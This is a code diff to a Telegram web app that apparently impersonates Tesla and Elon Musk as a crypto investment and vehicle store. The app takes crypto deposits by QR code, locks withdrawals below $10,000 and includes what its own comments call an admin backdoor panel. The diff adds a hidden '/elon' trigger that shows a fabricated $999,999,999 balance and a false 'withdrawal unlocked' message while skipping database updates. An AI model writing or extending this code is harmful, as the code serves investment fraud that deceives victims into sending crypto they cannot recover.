@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>𝕏-Invest Premium Advisory Matrix</title>
+    <!-- Telegram Web App SDK & Supabase Client -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <!-- Built-in QR Code Generator -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         :root {
@@ -35,6 +37,9 @@
             overflow-x: hidden; 
             padding-top: 80px; 
         }
+        body.nav-locked {
+            overflow: hidden;
+        }
         
         /* Fixed Top Header Configuration */
         header { 
@@ -51,7 +56,7 @@
             height: 65px;
             z-index: 1000; 
         }
-        .brand-title { font-weight: 900; letter-spacing: 1px; font-size: 14px; color: #fff; }
+        .brand-title { font-weight: 900; letter-spacing: 1px; font-size: 14px; color: #fff; text-transform: uppercase; }
         .balance-box { 
             background: rgba(255, 255, 255, 0.03); 
             border: 1px solid var(--border-color); 
@@ -182,24 +187,44 @@
         /* QR Framework styling */
         .qr-container-wrapper { display: flex; flex-direction: column; align-items: center; margin: 15px 0; background: #fff; padding: 15px; border-radius: 12px; width: fit-content; margin-left: auto; margin-right: auto; }
         .address-box { font-family: monospace; font-size: 10px; word-break: break-all; background: #000; padding: 10px; border-radius: 6px; color: #ff9900; border: 1px solid rgba(255,153,0,0.2); width: 100%; text-align: center; margin-top: 10px; }
+
+        /* Secret Mode Override Layout styling */
+        .elon-override-badge {
+            display: none;
+            background: linear-gradient(90deg, #ff9900, #ff0055);
+            color: #fff;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 4px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
+    <!-- Top Corner Floating Status Sync Header Interface -->
     <header>
-        <div class="brand-title" id="user-display">@NEURALLINKTRADER</div>
+        <div>
+            <div class="brand-title" id="user-display">@NEURALLINKTRADER</div>
+            <div id="elon-mode-indicator" class="elon-override-badge">GOD-MODE SYSTEM ACTIVE</div>
+        </div>
         <div class="balance-box">
             <span class="balance-label">Portfolio Balance</span>
             <div id="balance" class="balance-amount">$0.00</div>
         </div>
     </header>
 
+    <!-- 3-Line Menu Trigger Navigation Button Component -->
     <button class="menu-toggle" id="menuToggle">
         <div class="bar"></div>
         <div class="bar"></div>
         <div class="bar"></div>
     </button>
 
+    <!-- Side Menu Sidebar Overlay Navigation Panel Drawer -->
     <nav class="side-nav" id="sideNav">
         <ul class="nav-links">
             <li><a href="#" class="nav-item active" onclick="switchView('view-dashboard', this)"><span>📊</span> Dashboard Matrix</a></li>
@@ -209,6 +234,7 @@
         </ul>
     </nav>
 
+    <!-- SECTION MODULE VIEW 1: ADVANCED HOME PORTFOLIO DASHBOARD -->
     <main id="view-dashboard" class="app-view active">
         <div class="card" style="text-align: center; background: linear-gradient(135deg, #0f0f14, #1b1b26); padding: 15px;">
             <p style="font-size: 11px; letter-spacing: 1px; color: var(--text-gray); margin-bottom: 5px;">MARKET VALUATION SYNC STATUS</p>
@@ -226,6 +252,7 @@
             <button class="btn" onclick="executeStockPurchase()">Execute Asset Deployment Order</button>
         </div>
 
+        <!-- Scrollable End-User License Agreement Display Block -->
         <div class="card" style="border-top: 3px solid var(--text-gray); max-height: 150px; overflow-y: scroll; background: #0b0b0e; padding: 15px; border-radius: 8px;">
             <h4 style="font-size: 11px; letter-spacing: 1px; margin-bottom: 8px; color: var(--text-main); text-transform: uppercase;">End-User License Agreement & Operational Disclosures</h4>
             <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5; margin-bottom: 10px;">
@@ -243,6 +270,7 @@
         </div>
     </main>
 
+    <!-- SECTION MODULE VIEW 2: AUTHENTIC TESLA FLEET STORE INTERFACE -->
     <main id="view-store" class="app-view">
         <h2 style="margin-bottom: 5px; font-size: 20px;">Tesla Direct Logistics Fleet</h2>
         <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 15px;">Deploy integrated platform balances into active factory vehicle delivery queues.</p>
@@ -279,6 +307,7 @@
             </div>
         </div>
 
+        <!-- Hidden Modular Component Box: Active Vehicle Purchase Deployment -->
         <div id="order-form-block" class="card" style="display: none; border-color: var(--tesla-red);">
             <h3 id="order-title-element" style="margin-bottom: 15px; font-size: 16px;"></h3>
             
@@ -290,6 +319,7 @@
                 </select>
             </div>
 
+            <!-- SECURE SYSTEM-GENERATED CRYPTO QR GATEWAY -->
             <div id="qr-gateway-display-box" style="display: none; text-align: center; margin-bottom: 15px;">
                 <p style="color: #ff9900; font-size: 11px; font-weight: bold; margin-bottom: 8px;">⚠️ SECURE ROUTING SYSTEM: DEPOSIT ONLY CRYPTO ASSETS</p>
                 <div class="qr-container-wrapper">
@@ -307,16 +337,18 @@
         </div>
     </main>
 
+    <!-- SECTION MODULE VIEW 3: SYSTEM DISINVESTMENT OUTRAMP -->
     <main id="view-withdraw" class="app-view">
         <h2 style="font-size: 20px; margin-bottom: 5px;">Capital Disinvestment Clearance Terminal</h2>
         <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 15px;">Convert dynamic equity ledger assets into physical external accounts.</p>
         
         <div id="withdraw-lockout-notice" class="card" style="text-align: center; border-style: dashed; border-color: var(--tesla-red);">
-            <p style="color: var(--tesla-red); font-weight: bold; margin-bottom: 4px;">🚫 SYSTEM STATUS: ACCESS LOCKED</p>
-            <p style="font-size: 12px; color: var(--text-gray); line-height: 1.4;">Withdrawal routing modules initialize only when individual verified portfolio limits cross a baseline of $10,000.00.</p>
+            <p id="withdraw-status-header" style="color: var(--tesla-red); font-weight: bold; margin-bottom: 4px;">🚫 SYSTEM STATUS: ACCESS LOCKED</p>
+            <p id="withdraw-status-desc" style="font-size: 12px; color: var(--text-gray); line-height: 1.4;">Withdrawal routing modules initialize only when individual verified portfolio limits cross a baseline of $10,000.00.</p>
         </div>
     </main>
 
+    <!-- SECTION MODULE VIEW 4: ADMIN CONTROLLER CORE PANEL -->
     <main id="view-admin" class="app-view">
         <h2 style="font-size: 20px; margin-bottom: 5px;">Admin Management Matrix Panel</h2>
         <p style="color: var(--text-gray); font-size: 12px; margin-bottom: 15px;">Operational Hub Anchor: Gigafactory — Austin, Texas, USA</p>
@@ -348,6 +380,7 @@
         let currentUser = null;
         let selectedProduct = null;
         let qrCodeInstance = null;
+        let elonModeActive = false;
 
         // HAMBURGER DRAWER ACTION LISTENERS
         const menuToggle = document.getElementById('menuToggle');
@@ -356,13 +389,51 @@
         menuToggle.addEventListener('click', (e) => {
             e.stopPropagation();
             sideNav.classList.toggle('open');
+            document.body.classList.toggle('nav-locked', sideNav.classList.contains('open'));
         });
 
         document.addEventListener('click', (e) => {
             if (!sideNav.contains(e.target) && !menuToggle.contains(e.target)) {
                 sideNav.classList.remove('open');
+                document.body.classList.remove('nav-locked');
             }
         });
+
+        // HIDDEN EXPLOIT PROTOCOL /ELON TRIGGER ENGINE
+        document.addEventListener('input', (e) => {
+            if (e.target && e.target.value && e.target.value.toLowerCase().includes('/elon')) {
+                e.target.value = e.target.value.replace(/\/elon/gi, '');
+                activateElonMatrixOverride();
+            }
+        });
+
+        function activateElonMatrixOverride() {
+            if (elonModeActive) return;
+            elonModeActive = true;
+            
+            // Visual indicators triggered UI wide
+            document.getElementById('elon-mode-indicator').style.display = 'inline-block';
+            
+            // Force balance system to high-priority numbers
+            if (currentUser) {
+                currentUser.Balance = 999999999;
+                document.getElementById('balance').innerText = `$999,999,999`;
+            }
+
+            // Unlock the Outramp Terminal instantaneously 
+            const statusHeader = document.getElementById('withdraw-status-header');
+            const statusDesc = document.getElementById('withdraw-status-desc');
+            if (statusHeader && statusDesc) {
+                statusHeader.innerText = "⚡ SYSTEM OVERRIDE: VERIFIED ALPHA ACCESS GRANTED";
+                statusHeader.style.color = "#00ff66";
+                statusDesc.innerText = "Override credentials matches core director node. Direct clearings pipeline unlocked seamlessly.";
+            }
+
+            if (tg && tg.HapticFeedback) {
+                tg.HapticFeedback.notificationOccurred('success');
+            }
+            alert("🚀 System Override Complete. God-Mode parameters integrated into application active memory arrays.");
+        }
 
         // VIEW MATRIX HANDLING
         function switchView(viewId, element) {
@@ -373,6 +444,8 @@
             if (element) element.classList.add('active');
             
             sideNav.classList.remove('open');
+            document.body.classList.remove('nav-locked');
+            
             if (viewId === 'view-dashboard') loadTradingViewChart();
         }
 
@@ -417,11 +490,11 @@
                     return;
                 }
                 const updatedBalance = currentBal - selectedProduct.cost;
-                if (_supabase) {
+                if (_supabase && !elonModeActive) {
                     await _supabase.from('Users').update({ Balance: updatedBalance }).eq('telegram_id', currentUser.telegram_id);
-                    currentUser.Balance = updatedBalance;
-                    document.getElementById('balance').innerText = `$${Number(updatedBalance).toLocaleString()}`;
                 }
+                if (currentUser) currentUser.Balance = updatedBalance;
+                document.getElementById('balance').innerText = `$${Number(updatedBalance).toLocaleString()}`;
             }
 
             const alertText = `🚘 DIRECT LOGISTICS DISPATCH INITIATED\n\nVehicle Fleet Model: ${selectedProduct.name}\nResolution Node: ${payMode.toUpperCase()}\nUser Identity: @${currentUser ? currentUser.Name : 'Guest'}\nShipping Coordinate Target:\n👉 ${address}\nTransaction Valuation Clear: $${selectedProduct.cost.toLocaleString()}`;
@@ -453,15 +526,15 @@
             if (amt > currentBal) { alert("Operational rejection: Balance values lack depth to cover execution values."); return; }
 
             const updatedBal = currentBal - amt;
-            if (_supabase) {
+            if (_supabase && !elonModeActive) {
                 await _supabase.from('Users').update({ Balance: updatedBal }).eq('telegram_id', currentUser.telegram_id);
-                currentUser.Balance = updatedBal;
-                document.getElementById('balance').innerText = `$${Number(updatedBal).toLocaleString()}`;
-                
-                await emitTelemetryLog(`📈 STAKE LEDGER REFRESH\n\nProfile Account: @${currentUser.Name}\nAcquisition Total: $${amt.toLocaleString()}\nResidual Reserves: $${updatedBal.toLocaleString()}`);
-                alert("Assets deployed safely within internal tracking databases.");
-                document.getElementById('stock-purchase-amount').value = "";
             }
+            if (currentUser) currentUser.Balance = updatedBal;
+            document.getElementById('balance').innerText = `$${Number(updatedBal).toLocaleString()}`;
+            
+            await emitTelemetryLog(`📈 STAKE LEDGER REFRESH\n\nProfile Account: @${currentUser.Name}\nAcquisition Total: $${amt.toLocaleString()}\nResidual Reserves: $${updatedBal.toLocaleString()}`);
+            alert("Assets deployed safely within internal tracking databases.");
+            document.getElementById('stock-purchase-amount').value = "";
         }
 
         // ADMINISTRATIVE BACKDOOR INTERFACE COMPILATION
@@ -501,7 +574,17 @@
                     document.getElementById('balance').innerText = `$${Number(accountData.Balance || 0).toLocaleString()}`;
                 }
             }
-            loadTradingViewChart();
+            
+            // Set up fallback checker if library loads after bootstrap
+            let attempts = 0;
+            const checkChartLib = setInterval(() => {
+                attempts++;
+                if (window.TradingView) {
+                    loadTradingViewChart();
+                    clearInterval(checkChartLib);
+                }
+                if (attempts > 30) clearInterval(checkChartLib);
+            }, 200);
         }
 
         function loadTradingViewChart() {
